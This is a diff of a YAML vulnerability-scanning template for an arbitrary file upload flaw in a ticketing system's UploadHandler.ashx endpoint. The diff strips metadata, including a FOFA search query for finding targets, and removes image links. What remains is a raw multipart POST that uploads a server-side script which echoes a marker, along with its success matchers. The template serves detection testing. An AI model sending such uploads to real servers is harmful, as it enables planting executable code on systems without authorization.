@@ -3,12 +3,8 @@ info:
   name: 中成科信票务管理系统UploadHandler.ashx任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gt3u5utioq1skxph'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gt3u5utioq1skxph
-    fofa: icon_hash="1632964065" || icon_hash="-2142050529"
 http:
 - raw:
   - 'POST /WeChat/ashx/UploadHandler.ashx HTTP/1.1
@@ -39,9 +35,7 @@ http:
 
     <% Response.Write("tdhp3nkd") %>
 
-    ------v0rgrenc6exzqmjdymsoe68illorksy8--
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600244643-52a5844a-cf10-46c6-b56e-fa900c21bcd9.png)'
+    ------v0rgrenc6exzqmjdymsoe68illorksy8--'
   redirects: false
   matchers:
   - status:
@@ -60,10 +54,7 @@ http:
 
     Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 
-    Connection: close
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600244906-bc9ac6ba-cba9-4777-a016-6b83bcaf7126.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
